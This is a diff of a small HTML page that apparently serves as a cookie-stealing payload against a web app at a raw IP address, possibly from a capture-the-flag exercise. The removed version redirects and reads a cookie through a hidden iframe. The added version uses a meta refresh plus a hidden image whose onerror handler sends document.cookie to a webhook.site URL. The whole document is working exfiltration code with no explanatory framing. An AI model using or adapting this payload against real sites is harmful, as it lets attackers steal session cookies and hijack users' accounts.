@@ -1,28 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <script>
-        // Step 1: Redirect to report.html (where the cookie exists)
-        window.location = "http://167.71.200.118:7002/report";
-        
-        // Step 2: After 2 seconds, steal the cookie from report.html
-        setTimeout(() => {
-            // Create an invisible iframe pointing back to report.html
-            const iframe = document.createElement("iframe");
-            iframe.src = "http://167.71.200.118:7002/report";
-            iframe.style.display = "none";
-            
-            // When the iframe loads, extract its cookie
-            iframe.onload = () => {
-                const cookie = iframe.contentDocument.cookie;
-                fetch("https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2?cookie=" + encodeURIComponent(cookie));
-            };
-            
-            document.body.appendChild(iframe);
-        }, 2000);
-    </script>
+    <meta http-equiv="refresh" content="0;url=http://167.71.200.118:7002/report">
 </head>
 <body>
-    <h1>Redirecting...</h1>
+    <!-- This will execute after the redirect to report.html -->
+    <img 
+        src="x" 
+        onerror="fetch('https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2?cookie=' + document.cookie)"
+        style="display:none"
+    >
 </body>
+</html>
